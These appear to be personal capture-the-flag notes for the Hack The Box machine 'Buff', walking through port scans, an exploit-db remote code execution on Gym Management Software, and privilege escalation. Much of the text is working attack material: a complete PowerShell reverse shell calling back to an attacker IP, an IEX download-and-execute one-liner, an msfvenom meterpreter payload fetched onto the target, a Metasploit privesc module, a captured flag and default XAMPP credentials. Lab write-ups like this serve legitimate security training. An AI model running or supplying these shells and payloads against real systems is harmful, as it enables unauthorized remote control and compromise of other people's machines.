Buff --- 20 points --- 10.10.10.198
===

`sudo nmap -p- --min-rate=1000 -T4 -oN nmap_fast --stats-every 15s 10.10.10.198`    
PORT     STATE SERVICE    
7680/tcp open  pando-pub    
8080/tcp open  http-proxy    


`sudo nmap -A -oN nmap_details --stats-every 15s --script=/home/stddel/git/vulscan/vulscan.nse -p(cat nmap_results | grep '^.[0-9]' | cut -d '/' -f 1 |  tr '\n' ',' | sed 's/,$//g') 10.10.10.198`    

8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)   
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6    

PHP info site with email/password login option   

`python ~/git/dirsearch/dirsearch.py -u 10.10.10.198:8080 -E | tee buff_dirsearch.log`   
Totally custom site with plain js that may be read.    
Cannot login, register or upload anythin without creds, but there pages for this    

Nothing interesting with searches.    
Check on the contact page made with "Gym Management Software 1.0". Is it even a real thing?    
Apparently, yes. It even has its own page on exploit-db    
https://www.exploit-db.com/exploits/48506    
All the writeup is there    

```
python buff_shell_run.py http://10.10.10.198:8080/    
C:\xampp\htdocs\gym\upload> whoami
PNG
▒
buff\shaun
```

Telepathy is horrible. Lets upgrade to powershell.    
```
>> echo '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.18",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' > rs.ps1

>> sudo python3 -m http.server 80
>> powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.18/rs.ps1\");

## cat user.txt
4c1836f235e38616c766f2f873b30e2c

## systeminfo
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.17134 N/A Build 17134

```

There is an exploit for this version, letus try to make it happen    

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.18 lport=8080 -f exe > buff.exe

(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.18/buff.exe","buff.exe")

use windows/local/appxsvc_hard_link_privesc

```
1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).  
```
